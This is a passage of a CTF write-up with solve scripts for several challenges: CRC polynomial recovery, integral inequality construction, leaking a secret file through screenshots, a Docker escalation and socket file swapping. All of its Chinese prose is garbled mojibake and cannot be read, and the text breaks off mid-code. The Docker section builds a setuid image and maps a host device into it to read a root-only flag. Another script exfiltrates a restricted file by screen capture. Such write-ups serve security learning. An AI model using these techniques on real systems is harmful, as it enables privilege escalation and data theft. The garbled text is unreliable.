**`flag{p0werful_r3gular_expr3ssion_hard_9f772c3e8f}`**


## æƒœå­—å¦‚é‡‘ 3.0

> XZRJificated WritUp Can B Found [Her](https://youtu.be/dQw4w9WgXcQ?si=4TOtunBgchVDsHJC)

### é¢˜ç›® A

ç›´æ¥æŒ‰ç…§è§„åˆ™ä¿®å¤æ¯ä¸€è¡Œä»£ç ç›´è‡³æ¯ä¸ªå•è¯éƒ½è¢«é«˜äº®å³å¯ã€‚

**`flag{C0mpl3ted-Th3-Pyth0n-C0de-N0w}`**

### é¢˜ç›® B

æŒ‰ç…§ç¬¬ä¸€éƒ¨åˆ†ä¿®å¤å®Œå‘ç°ç¬¬ 7 è¡Œ CRC48 çš„å¤šé¡¹å¼ä¸è§äº†ï¼Œç„¶å...æˆ‘åˆå¡äº†ã€‚è¿™ä¸ª b å“ˆå¸Œæ€ä¹ˆçœ‹éƒ½ä¸èƒ½å–é€†å§ï¼‰  
è¿‡äº†å¾ˆä¹…ä¹‹åå†é‡æ–°è¯»äº†ä¸€é `crc` çš„ä»£ç ï¼Œå‘ç°å¦‚æœåªè¾“å…¥ä¸€ä¸ªå­—èŠ‚ `\x7F`ï¼Œé‚£ä¹ˆè¾“å‡ºçš„ç»“æœå°±ä¼šæ˜¯ `flip ^ 0xFF0000000000`ã€‚ç±»ä¼¼çš„ï¼Œå¦‚æœè¾“å…¥æ˜¯ `\xFF\x7F`ï¼Œé‚£ä¹ˆå°±ä¼šè¾“å‡º `flip ^ 0xFFFF00000000`ã€‚  
é‚£ä¹ˆå¦‚æœæˆ‘ä»¬é‡å¤æ„å»ºè¿™æ ·çš„è¾“å…¥ï¼Œæˆ‘ä»¬å°±èƒ½å¾—åˆ°å¯æ§çš„ `hash` å‰ç»“æœã€‚æŠŠä»–ä»¬çš„ `hash` è¿‡ç¨‹æ‰”ç»™ä¼Ÿå¤§çš„ z3 å°±å¯ä»¥è§£å‡º `flip` çš„å€¼äº†ã€‚

```python
import requests
from z3 import *

target = "http://202.38.93.141:19975/answer_b.py"

def get_hash(line):
    with open("2.py", "r") as f:
        l = f.readlines()
    l = [_.encode() for _ in l]
    l[6] = bytes(line) + b"\n"

    response = requests.post(target, headers={"Cookie": ""}, data=b"".join(l))
    message = response.json()["wrong_hints"]["7"]
    h = message.split("(")[1].split(")")[0]
    return int(bytes.fromhex(h)[::-1].hex(), 16)


x = BitVec("x", 48)
u2 = BitVecVal(241818181881667, 48)
u1 = BitVecVal(279270832074457, 48)
u0 = BitVecVal(202208575380941, 48)

f = (1 << 48) - 1
s = Solver()
for i in range(3):
    c = (f << (40 - i * 8)) & f
    b = [0xFF] * i + [0x7F]
    t = get_hash(b)

    c = BitVecVal(c, 48)
    t = BitVecVal(t, 48)
    s.add(((x ^ c) * ((x ^ c) * u2 + u1) + u0) == t)
s.check()
m = s.model()

flip = m[x].as_long()
poly = bin(flip)[2:][::-1].replace("1", "B").replace("0", "b")

line = f"    poly, poly_degree = 'B{poly}', 48 \n"
with open("2.py", "r") as f:
    l = f.readlines()
l[6] = line
with open("2.py", "w") as f:
    f.write("".join(l))

response = requests.post(target, headers={"Cookie": ""}, data="".join(l))
print(response.json())
```

**`flag{Succe55fu11y-Deduced-A-CRC-Po1ynomia1}`**


## ä¼˜é›…çš„ä¸ç­‰å¼

> è¿™ä¸‹åœ¨çŸ¥ä¹ä¹±åˆ·çš„â€œæ³¨æ„åˆ°...â€ç»ˆäºæ´¾ä¸Šç”¨åœºäº†

ğŸ¤“â˜æˆ‘ä¹‹å‰åˆšå¥½åœ¨çŸ¥ä¹çœ‹åˆ°äº†ä¸€ç¯‡[ç›¸å…³çš„ä¸“æ ](https://zhuanlan.zhihu.com/p/669285539)ï¼Œè¿˜æ”¶è—äº†ä»¥å¤‡ä¸æ—¶ä¹‹éœ€ã€‚æ€»ç»“ä¸€ä¸‹å°±æ˜¯å½¢å¦‚
$$\int_0^1 \frac{x^n(1-x)^n(a+bx+cx^2)}{1+x^2}dx$$
çš„ç§¯åˆ†å¯ä»¥å¾—åˆ° $\pi, \ln2, 1$ çš„çº¿æ€§ç»„åˆã€‚  
é‚£ä¹ˆæˆ‘ä»¬åªè¦å¯¹äºæŸä¸ª $n$ çš„å€¼ç¨å¾®è®¡ç®—ä¸€ä¸‹ $a, b, c$ï¼Œä½¿å¾— $\pi$ çš„ç³»æ•°æ˜¯ 1ã€$\ln2$ çš„ç³»æ•°æ˜¯ 0ã€å¸¸æ•°é¡¹æ˜¯è´Ÿçš„ç›®æ ‡æœ‰ç†æ•°ï¼Œä¸” $a+bx+cx^2$ åœ¨ $[0, 1]$ ä¸Šéè´Ÿå°± Q.E.D. äº†ï¼

### Easy

å– $n = 1$ï¼Œå¾—åˆ°
$$\int_0^1 \frac{x(1-x)(a+bx+cx^2)}{1+x^2}dx = \frac{a-b-c}{4}\pi + \frac{a+b-c}{2}\ln2 + \frac{-6a+3b+7c}{6}$$
é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¾—åˆ°è¿™ä¸ªæ–¹ç¨‹ç»„
$$\begin{cases}
a-b-c&=4 \\
a+b-c&=0 \\
-6a+3b+7c&=-16
\end{cases}$$
è§£å¾— $a=4,b=-2,c=2$ï¼ŒéªŒè¯ä¸€ä¸‹ $4-2x+2x^2$ åœ¨ $[0,1]$ ä¸Šéè´Ÿå³å¯æäº¤ï¼š

```python
x * (1-x) * (4-2*x+2*x**2) / (1+x**2)
```

**`flag{y0u_ar3_g0od_at_constructi0n_34ba9b9df2}`**

### Hard

ä¸Šé¢çš„è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œæœ‰æ•´æ•´ 3 ä¸ªç³»æ•°éœ€è¦æˆ‘ä»¬æ±‚è§£ï¼Œè§£å‡ºæ¥çš„æœ‰ç†æ•°å¯èƒ½å¾ˆå¿«å°±è¶…è¿‡ 400 çš„æœ€å¤§é•¿åº¦é™åˆ¶äº†ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰æ›´ç®€å•çš„å¼å­å‘¢ï¼Ÿ  
è¯¶ï¼Œè¿˜æ˜¯é‚£ä¸ªä¸“æ ï¼Œç¿»åˆ°æœ€ä¸‹é¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªåªæœ‰ä¸¤ä¸ªç³»æ•°çš„ç§¯åˆ†ï¼š
$$\int_0^1 \frac{x^{2n}(1-x^2)^n(a+bx^2)}{1+x^2}dx$$
è¿™ä¸ªç§¯åˆ†çš„ç»“æœä¸ä¼šåŒ…å« $\ln2$ çš„é¡¹ã€‚é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ $\pi$ çš„ç³»æ•°ä¸º 1ï¼Œå¸¸æ•°é¡¹ä¸ºè´Ÿçš„ç›®æ ‡æœ‰ç†æ•°ï¼Œä¸” $f(0)=a \geq 0, f(1)=a+b \geq 0$ å³å¯ã€‚

å› ä¸ºäº¤äº’æ—¶é—´æœ‰é™ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæŠŠæ¯ä¸€ä¸ª $n$ å¯¹åº”çš„ $\pi$ çš„ç³»æ•°å’Œå¸¸æ•°é¡¹å…³äº $a$ å’Œ $b$ çš„è¡¨è¾¾å¼è®¡ç®—å¥½ï¼Œè¿™æ ·åœ¨å¼€å§‹äº¤äº’ä¹‹åæ¯è½®æˆ‘ä»¬åªéœ€è¦è§£ä¸€ä¸ªç®€å•çš„äºŒå…ƒä¸€æ¬¡æ–¹ç¨‹å³å¯ã€‚

```python
from pwn import *
import sympy
import os
import pickle


a, b, x = sympy.symbols("a b x")
if os.path.exists("attention.pickle"):
    with open("attention.pickle", "rb") as f:
        N, integral = pickle.load(f)
else:
    N = 101
    integral = [None] * N
    for k in range(1, N):
        s = f"x**{2*k} * (1 - x**2)**{k} * (a + b*x**2) / (1 + x**2)"
        f = sympy.parsing.sympy_parser.parse_expr(s)
        i = sympy.integrate(f, (x, 0, 1))
        i = i.simplify()
        p = i.coeff(sympy.pi)
        c = (i - i.coeff(sympy.pi) * sympy.pi).simplify()
        integral[k] = (p, c)

    with open("inq.pickle", "wb") as f:
        pickle.dump(integral, f)

r = remote("202.38.93.141", 14514)
r.recvline()
r.sendline(os.environ["TOKEN"].encode())

# difficulty 0
r.recvuntil(b"f(x): ")
r.sendline(b"4*((1-x**2)**(1/2)-(1-x))")

# difficulty 1
r.recvuntil(b"f(x): ")
r.sendline(b"x*(1-x)*(4-2*x+2*x**2)/(1+x**2)")
r.recvline()
print(r.recvline().decode().strip())

# difficulty 2+
def solve(n):
    r.recvuntil(b"pi>=")
    frac = r.recvline().decode().strip()
    if "/" in frac:
        p, q = map(int, frac.split("/"))
    else:
        p = int(frac)
        q = 1
    print(f"p={p}\nq={q}")
    p = sympy.Integer(p)
    q = sympy.Integer(q)
    r.recvuntil(b"f(x): ")

    for i in range(n, N):
        pi, c = integral[i]
        sol = sympy.solve([pi - 1, c + p / q], (a, b))
        sa, sb = sol[a], sol[b]
        if sa >= 0 and sa + sb >= 0:
            na, da = sa.as_numer_denom()
            nb, db = sb.as_numer_denom()
            d = max(da, db)
            na = sa * d
            nb = sb * d
            s = f"x**{2*i}*(1-x**2)**{i}*({na}+{nb}*x**2)/(1+x**2)/{d}"
            if len(s) <= 400:
                print(f"difficulty {n} solution found at {i} with {len(s)} chars")
                break
    r.sendline(s.encode())

for n in range(2, 40):
    solve(n)
r.interactive()
```

æœ€åä¸€è½®åœ¨ $n=65$ å·¦å³å°±èƒ½æ‰¾åˆ°ç¬¦åˆé•¿åº¦è¦æ±‚çš„è§£ã€‚

**`flag{y0u_ar3_7he_Ramanujan_0f_in3quality_0601257eac}`**

## æ— æ³•è·å¾—çš„ç§˜å¯†

> ä»€ä¹ˆæ—¶å€™èƒ½å‘æ˜è„‘æœºæ¥å£å•Š

å°è¯•ä¸€ä¸‹å¯ä»¥çœ‹åˆ° `/secret` æ˜¯ä¸ª 512KB çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åç¯å¢ƒé‡Œæ²¡æœ‰ä»»ä½•å¤–éƒ¨ç½‘ç»œè¿æ¥ï¼Œæ‰€ä»¥åªèƒ½ç”¨è§†è§‰æ–¹æ³•æŠŠæ–‡ä»¶æå‡ºæ¥ã€‚  
æˆ‘æœ€å¼€å§‹æƒ³ç”¨ `base64` ç¼–ç ï¼Œåœ¨å½•å±åç”¨ OCR æŠŠç¼–ç é‡å»ºä¸€éã€‚ä½†å¥ˆä½•å¸¦å®½å¤ªä½ï¼ˆä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºæˆ‘åœ¨æµ·å¤–ï¼Ÿï¼‰ï¼Œå›¾åƒä¸€ç‰‡æ¨¡ç³Šï¼ŒOCR æ„‰å¿«çš„ç½¢å·¥äº†ã€‚åªå¥½ç”¨æ›´ robust çš„äºŒè¿›åˆ¶ç¼–ç ï¼Œ0 æ˜¾ç¤ºä¸º `'0'`ï¼Œ1 æ˜¾ç¤ºä¸º `' '`ï¼Œç„¶åæ ¹æ®æ¯ä¸ªå­—ç¬¦æ¡†å†…äº®åº¦çš„å¹³å‡å€¼è¿‡ä¸€ä¸ªé˜ˆå€¼æ¥åˆ¤æ–­æ¯ä½æ•°ã€‚  
æŠŠç»ˆç«¯æ”¾åˆ°æœ€å¤§å¯ä»¥å¾—åˆ° `36x100` çš„å­—ç¬¦ã€‚å¸å– base64 çš„æ•™è®­ï¼Œæˆ‘åªç”¨äº†å‰ 34 è¡Œæ˜¾ç¤ºæ•°æ®ï¼Œç¬¬ 35 è¡Œç”¨æ¥æ˜¾ç¤ºæœ¬é¡µæ•°æ®çš„ CRC32 ç”¨äºæ ¡éªŒï¼ˆè™½ç„¶ç”±äºäºŒè¿›åˆ¶å¤ª robust äº† CRC æ²¡æ´¾ä¸Šä¸€ç‚¹ç”¨ï¼‰ï¼Œæœ€åä¸€è¡Œç”¨äºæ˜¾ç¤ºæœ¬é¡µé¡µç ä»¥é˜²é¡ºåºé”™ä¹±ã€‚  
æœ€ç»ˆè®°å½•ä¸‹ 1234 å¼ å›¾ç‰‡ï¼Œåœ¨æœ¬åœ°å†å¤„ç†ä¸€éé‡å»ºæ–‡ä»¶å³å¯ã€‚

**ç”Ÿæˆé¡µé¢åŠæˆªå›¾äº¤äº’**

æ•´ä½“è¿è¡Œä¸‹æ¥åº”è¯¥åˆšå¥½èƒ½åœ¨ä¸€ä¸ª session çš„ 15 åˆ†é’Ÿå†…è·‘å®Œã€‚  
å†™è¿™ç§é”®é¼ æ§åˆ¶çš„è„šæœ¬ä¸€å®šè¦æ³¨æ„é€€å‡ºæ¡ä»¶ï¼Œæˆ‘ç¬¬ä¸€ä¸ªè„šæœ¬å·®ç‚¹ç”¨æŸäº›å¥‡æ€ªçš„å¿«æ·é”®æŠŠ Windows ç¼©æ”¾è°ƒåˆ° 500% äº†ï¼ˆè¢«è¿«èµ›åšç¯æ³¡xï¼‰

```python
import pyautogui
import mss
import time

code = """rm a.py
vi a.py
i
def generate_crc32_table():
table = []
for i in range(256):
crc = i
for _ in range(8):
if crc & 1:
crc = (crc >> 1) ^ 0xEDB88320
\belse:
crc >>= 1
\b\btable.append(crc)
\breturn table

CRC32_TABLE = generate_crc32_table()

def crc32(data):
crc = 0xFFFFFFFF
for byte in data:
crc = (crc >> 8) ^ CRC32_TABLE[(crc ^ byte) & 0xFF]
\bres = crc ^ 0xFFFFFFFF
return res.to_bytes(4, byteorder='big')

with open("/secret", "rb") as f:
c = f.read()
\bn = 3400 // 8
for i in [1233]:
i *= n
#for i in range(1000 * n, len(c), n):
s = ""
for b in c[i:]:
x = bin(b)[2:]
s += x.zfill(8)
\bprint(s.replace("1", " ")+"0")
s = ""
for b in crc32(c[i:]):
x = bin(b)[2:]
s += x.zfill(8)
\bprint(s.replace("1", " ")+"0")
a = "0"+bin(i//n)[2:].replace("1", " ")+"0"
input(a.ljust(30))"""

time.sleep(5)
pyautogui.typewrite(code)
time.sleep(2)
pyautogui.press("esc")
time.sleep(0.5)
pyautogui.typewrite(":wq\n")
time.sleep(0.5)
pyautogui.typewrite("python3 a.py")

total_len = 524288
n = 3400 // 8
with mss.mss() as sct:
    for i in range(1234):
        pyautogui.press("enter")
        time.sleep(1)
        sct.shot(output=f"img/{i+4000}.png")
        time.sleep(0.5)
```

**æˆªå›¾åˆ†æ**

æœ€åä¸€å¼ å›¾æœ‰ä¸€äº›è¾¹ç•Œæ¡ä»¶ï¼Œæˆ‘åŸºæœ¬æ˜¯åœ¨ jupyter notebook é‡Œè¾¹è°ƒè¾¹è·‘çš„ï¼Œæ‰€ä»¥è¿™ä¸ªè„šæœ¬å¯èƒ½ä¸å®Œå…¨èƒ½ç”¨

```python
import numpy as np
import cv2
import tqdm
import os


def generate_crc32_table():
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xEDB88320
            else:
                crc >>= 1
        table.append(crc)
    return table

CRC32_TABLE = generate_crc32_table()

def crc32(data: bytes) -> int:
    crc = 0xFFFFFFFF
    for byte in data:
        crc = (crc >> 8) ^ CRC32_TABLE[(crc ^ byte) & 0xFF]
    res = crc ^ 0xFFFFFFFF
    return res.to_bytes(4, byteorder="big")


l = []
for filename in os.listdir("img"):
    im = cv2.imread(f"img/{filename}", cv2.IMREAD_GRAYSCALE)
    for y in range(311, 311 + 38 * 36, 38):
        for x in range(135, 135 + 20 * 100, 20):
            l.append(im[y : y + 39, x : x + 21].mean())

x = np.array(l) / 255
x = x.reshape(-1, 36, 100)
x = (x < 0.1).astype(np.uint8)

d = dict()
for i in range(x.shape[0]):
    im = x[i][:34]
    data = "".join(map(str, im.flatten()))
    data = int(data, 2).to_bytes(34 * 100 // 8, "big")
    crc = crc32(data)

    valid = x[i, 34, :32]
    valid = int("".join(map(str, valid)), 2).to_bytes(4, "big")

    n = x[i, 35, :20]
    n = "".join(map(str, n)).rstrip("1")[1:-1]
    n = int(n, 2)
    if crc != valid:
        # 1233 is expected to fail
        print(f"image {n} has wrong crc")
    else:
        d[n] = data

# last picture is not full screen
l = []
im = cv2.imread(f"img/1233.png", cv2.IMREAD_GRAYSCALE)
for y in range(311, 311 + 38 * 36, 38):
    for x in range(135, 135 + 20 * 100, 20):
        l.append(im[y : y + 39, x : x + 21].mean())

im = np.array(l) / 255
im = im.reshape(36, 100)
im = (im < 0.1).astype(np.uint8)

data = im[13:-1].flatten()
data = "".join(map(str, data)).rstrip("1")[:-1]
crc = data[-32:]
data = data[:-32]
data = int(data, 2).to_bytes(len(data) // 8, "big")
crc = int(crc, 2).to_bytes(4, "big")
assert crc32(data) == crc
d[1233] = data

res = b""
for i in range(1234):
    res += d[i]
with open("secret", "wb") as f:
    f.write(res)
```

æŠŠ `secret` äº¤ä¸Šå»å°±èƒ½æ‹¿åˆ° flag äº†ï¼ˆè¯è¯´è¿™æ˜¯ä¸ªå•¥æ–‡ä»¶ï¼Œæœ‰å½©è›‹å—ï¼‰

**`flag{SeCret_cAN_B3_Le4K3d_FrOm_R3s7RIc7Ed_Env_0c285f6000}`**

## Docker for Everyone Plus

> å’Œ `rz` ææ–—çš„ä¸€æ•´å¤©

ä¸€å¼€å§‹çœ‹åˆ°æ”¯æŒ ZMODEMï¼Œ[ä¸€äº›ä¸å¥½çš„å›å¿†](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob05-zserver)æ¶Œä¸Šå¿ƒå¤´ã€‚  
ä»ç®±åº•ç¿»å‡º MobaXTerm è¯•å›¾ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸€çœ‹ï¼Œæ€ä¹ˆè¢« skip äº†ï¼Ÿå†è¯•ï¼Œå† skipï¼Ÿ  
æ˜¯ä¸æ˜¯ Windows å’Œ WSL çš„æ–‡ä»¶ç³»ç»Ÿä¸å…¼å®¹å•Šï¼Œå€Ÿå®¤å‹çš„ Mac ç”¨ iTerm2 è¯•ä¸€ä¸‹ï¼Œæ€ä¹ˆè¿˜æ˜¯è¢« skipï¼Ÿ  
äºæ˜¯å°±åœ¨è¿™é‡Œå¡äº†ä¸€æ•´å¤©ã€‚æ™šä¸Šåƒé¥­çš„æ—¶å€™çµå…‰ä¹ç°ï¼Œæ„è¯†åˆ°å¦‚æœæˆ‘ä»¬æƒé™å¾ˆä½æ˜¯ä¸æ˜¯ä¸èƒ½éšä¾¿å†™æ–‡ä»¶å•Šã€‚éšæ‰‹æ‰“å¼€ `/tmp` å°è¯•ä¸Šä¼ ï¼Œæˆäº†ï¼

### No Enough Privilege

çœ‹é¢˜ç›®è¦æ±‚åŸºæœ¬ä¸Šæ˜¯è¦ä¸Šä¼ ä¸€ä¸ªè‡ªåˆ¶çš„ docker imageï¼Œç”¨ `sudo docker run --rm -u 1000:1000` åœ¨å®¹å™¨é‡Œè¶Šè¿‡æƒé™è¯»å–åˆ° flagã€‚  
ç”¨ `ls -la` æ³¨æ„åˆ° `/flag` æ˜¯ä¸€ä¸ªæŒ‡å‘ `/dev/vdb` çš„è½¯é“¾æ¥ã€‚åŒæ—¶å¯¹æ¯”ç¬¬äºŒé—®çš„ç¯å¢ƒå‘ç°å¯ä»¥ç”¨ `--device` æ¥æŠŠå®¹å™¨å¤–çš„ device æ˜ å°„åˆ°å®¹å™¨å†…ï¼ˆè€å¸ˆä½ è¿™ä¸ªç¬¬äºŒé—®é¢˜å¹²é‡Œä¸æ˜¯æœ‰ç¬¬ä¸€é—®çš„è§£æ³•å—xï¼‰  
äºæ˜¯æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª minimal imageï¼Œåœ¨é‡Œé¢åŒ…æ‹¬ä¸€ä¸ªæœ‰ root æƒé™çš„è„šæœ¬ï¼Œä»å®¹å™¨é‡Œæ˜ å°„å¥½çš„ device é‡Œè¯»å‡º flag å³å¯ã€‚

```c
#include <stdio.h>
int main()
{
    FILE *f = fopen("/dev/vdb", "r");
    int c;
    while ((c = fgetc(f)) != EOF)
        putchar(c);
    fclose(f);
    return 0;
}
```

```Dockerfile
FROM busybox
COPY t /t
RUN chmod u+s /t
```

è¿›å…¥ç¯å¢ƒ `sudo docker image load` åè¿è¡Œé‡Œé¢ç¼–è¯‘å¥½çš„ `t` å³å¯ï¼š  
`sudo docker run --rm -u 1000:1000 --device=/dev/vdb:/dev/vdb {image_name} /t`

**`flag{dONT_1OAD_uNTRusT3D_1ma6e_0f86fac510_plz!}`**


## çœ‹ä¸è§çš„å½¼æ–¹ï¼šäº¤æ¢ç©ºé—´

> ä¸æ‰æˆ‘å½“ CS:APP çš„ TA

é˜…è¯»ä¸€éé¢˜ç›®ï¼Œå‘ç°è¿™ä¸å°±æ˜¯ `proxylab` å—ï¼Ÿç«‹é©¬æ‹¿å‡ºäº†æˆ‘ TA æ—¶å€™çš„ä»£ç å¼€å§‹æ‰‹æ“æœåŠ¡å™¨ã€‚

### å°èœä¸€ç¢Ÿ

æ€è·¯å¾ˆç®€å•ï¼Œè®© Alice å½“ server åœ¨æœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç„¶åè®© Bob å½“ client å»å»ºç«‹ä¸€ä¸ª socketï¼Œè¿™æ ·ä¸¤è¾¹å°±å¯ä»¥ä¼ è¾“æ•°æ®äº†ã€‚  
å› ä¸ºæ–‡ä»¶çš„å¤§å°æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥å¯ä»¥æ¯è½®äº’ç›¸ä¼  1M çš„æ•°æ®ï¼Œæ”¶åˆ°åç”¨ `lseek()` æŠŠ `fd` çš„ offset è°ƒå›å—çš„å¼€å¤´è¦†ç›–å†™å…¥å³å¯ã€‚  
Client è¿™é‡Œæœ‰ä¸ªå°å‘æ˜¯ä¸çŸ¥é“è¿™ä¸¤ä¸ªè°å…ˆè¿è¡Œï¼Œæ‰€ä»¥å¯èƒ½ client å…ˆèµ·æ¥äº†ä½†æ˜¯ server è¿˜æ²¡å¼€å§‹ listenã€‚ä¸è¿‡åªè¦è®© client è¿æ¥ä¸ä¸Šçš„æ—¶å€™ sleep ä¸€ä¼šå†è¯•å‡ æ¬¡å°±è¡Œäº†ã€‚

**Alice (server)**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <errno.h>

#define PORT 12345
#define BLOCK_SIZE 1048576 // 1 MiB

ssize_t readn(int fd, char *buf, size_t n)
{
    size_t nleft = n;
    ssize_t nread;
    while (nleft > 0)
    {
        if ((nread = read(fd, buf, nleft)) < 0)
        {
            if (errno == EINTR)
                continue;
            return -1;
        }
        else if (nread == 0)
            break;
        nleft -= (size_t)nread;
        buf += nread;
    }
    return (ssize_t)(n - nleft);
}

ssize_t writen(int fd, char *buf, size_t n)
{
    size_t nleft = n;
    ssize_t nwritten;
    while (nleft > 0)
    {
        if ((nwritten = write(fd, buf, nleft)) < 0)
        {
            if (errno == EINTR)
                continue;
            return -1;
        }
        nleft -= (size_t)nwritten;
        buf += nwritten;
    }
    return (ssize_t)n;
}

int main()
{
    int server_fd, new_socket;
    struct sockaddr_in address;
    socklen_t addrlen = sizeof(address);
    char buffer[BLOCK_SIZE];
    int opt = 1;

    int file = open("/space/file", O_RDWR);
    if (file < 0)
    {
        perror("failed to open file");
        exit(EXIT_FAILURE);
    }

    // Create socket file descriptor (IPv4, TCP)
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
    {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Attach socket to the port (optional, but useful to reuse the port)
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)))
    {
        perror("setsockopt");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    // set address and port
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0)
    {
        perror("failed to bind");
        close(server_fd);
        close(file);
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 1) < 0)
    {
        perror("failed to listen");
        close(server_fd);
        close(file);
        exit(EXIT_FAILURE);
    }

    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen)) < 0)
    {
        perror("failed to accept connection");
        close(server_fd);
        close(file);
        exit(EXIT_FAILURE);
    }

    for (int block = 0; block < 128; ++block)
    {
        lseek(file, block * BLOCK_SIZE, SEEK_SET);
        if (readn(file, buffer, BLOCK_SIZE) <= 0)
        {
            perror("failed to read from file");
            close(new_socket);
            close(server_fd);
            close(file);
            exit(EXIT_FAILURE);
        }

        if (writen(new_socket, buffer, BLOCK_SIZE) < 0)
        {
            perror("failed to write to socket");
            close(new_socket);
            close(server_fd);
            close(file);
            exit(EXIT_FAILURE);
        }

        lseek(file, block * BLOCK_SIZE, SEEK_SET);
        if (readn(new_socket, buffer, BLOCK_SIZE) <= 0)
        {
            perror("failed to read from socket");
            close(new_socket);
            close(server_fd);
            close(file);
            exit(EXIT_FAILURE);
        }

        if (writen(file, buffer, BLOCK_SIZE) < 0)
        {
            perror("failed to write to file");
            close(new_socket);
            close(server_fd);
            close(file);
            exit(EXIT_FAILURE);
        }
    }

    close(new_socket);
    close(server_fd);
    close(file);
    return 0;
}
```

**Bob (client)**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>

#define PORT 12345
#define BLOCK_SIZE 1048576 // 1 MiB
#define SERVER_IP "127.0.0.1"

// å’Œä¸Šé¢ä¸€æ ·ï¼Œä¸ºäº†èŠ‚çœç©ºé—´å°±ä¸å†™äº†
ssize_t readn(int fd, char *buf, size_t n);
ssize_t writen(int fd, char *buf, size_t n);

int main()
{
    int sock = 0;
    struct sockaddr_in serv_addr;
    char buffer[BLOCK_SIZE];

    int file = open("/space/file", O_RDWR);
    if (file < 0)
    {
        perror("failed to open file");
        exit(EXIT_FAILURE);
    }

    // Create socket file descriptor (IPv4, TCP)
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("Socket creation error");
        exit(EXIT_FAILURE);
    }

    memset(&serv_addr, '0', sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Convert IPv4 address from text to binary form
    if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0)
    {
        perror("Invalid address/ Address not supported");
        close(sock);
        exit(EXIT_FAILURE);
    }

    int n = 0;
    while (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        if (n++ > 10)
        {
            perror("failed to connect");
            close(sock);
            close(file);
            exit(EXIT_FAILURE);
        }
        sleep(1);
    }

    // è¿™æ®µä¼ è¾“çš„é€»è¾‘ä¹Ÿå’Œä¸Šé¢ä¸€æ¨¡ä¸€æ ·çš„
    for (int block = 0; block < 128; ++block);

    close(sock);
    close(file);
    return 0;
}
```

**`flag{just A p1ece 0f cake_a181ff24c2}`**

### æ‰è¥Ÿè§è‚˜

è¿™ä¸‹ä¸èƒ½ç›´æ¥åœ¨åŒä¸€ä¸ªæ–‡ä»¶é‡Œè¯»å†™äº†ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿ  
æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ä¸¤è¾¹å…ˆæŠŠæ‰€æœ‰çš„å†…å®¹éƒ½ä¸€è‚¡è„‘è¯»è¿›å†…å­˜é‡Œï¼Œè¿™æ ·åœ¨å†…å­˜é‡Œäº¤æ¢å°±å¯ä»¥äº†ã€‚  
ä½†æ˜¯è¿™æ ·è¦æ±‚æˆ‘ä»¬è¯»æ–‡ä»¶çš„æ—¶å€™è¦è¾¹è¯»è¾¹åˆ ï¼Œæœç´¢äº†ä¸€ä¸‹å‘ç° `ftruncate()` å¯ä»¥æŠŠæ–‡ä»¶çš„æœ«å°¾åˆ æ‰ã€‚è¿™æ ·æˆ‘ä»¬å¯ä»¥å…ˆå»ºä¸€ä¸ª `char *buffer[128]` çš„æ•°ç»„ï¼Œä¹‹åæŒ‰ç…§é€†åºè¯»æ–‡ä»¶é‡Œçš„å—ã€‚æ¯è¯»ä¸€ä¸ªå—ä¹‹å‰ `malloc` å¯¹åº”çš„å†…å­˜ï¼Œè¯»å®Œä¹‹åå†æŠŠæ–‡ä»¶é‡Œæœ€åä¸€ä¸ªå—åˆ æ‰ï¼Œè¿™æ ·å†…å­˜å ç”¨æ•´ä½“å°±åªä¼šå¤šå‡º 1MBã€‚  
ä¸¤è¾¹éƒ½è¯»è¿›æ¥ä¹‹åå°±å¯ä»¥ç”¨ç¬¬ä¸€é—®çš„åšæ³•äº¤æ¢æ•°æ®ï¼Œå†ç”¨å’Œä¸Šé¢çš„æµç¨‹ç›¸åçš„æ–¹æ³•æŠŠæ•°æ®å†™åˆ°å¯¹åº”çš„æ–‡ä»¶é‡Œå³å¯ã€‚

**Alice (server)**  
è¿™é‡Œå› ä¸ºç›´æ¥æŠ„äº†ç¬¬ä¸€é—®çš„ä»£ç å¯¼è‡´ error handling ä¹±æˆä¸€å¨ï¼Œæ ¹æœ¬ä¸çŸ¥é“æœ‰æ²¡æœ‰å¥½å¥½é‡Šæ”¾èµ„æºã€‚å¥½å­©å­å¯åƒä¸‡ä¸è¦å­¦ä¹ è¿™ç§ç é£(x)

```c
int main()
{
    int server_fd, new_socket;
    struct sockaddr_in address;
    socklen_t addrlen = sizeof(address);
    char *buffer[128];
    int opt = 1;

    int file = open("/space/file", O_RDWR);
    if (file < 0)
    {
        perror("failed to open file");
        exit(EXIT_FAILURE);
    }
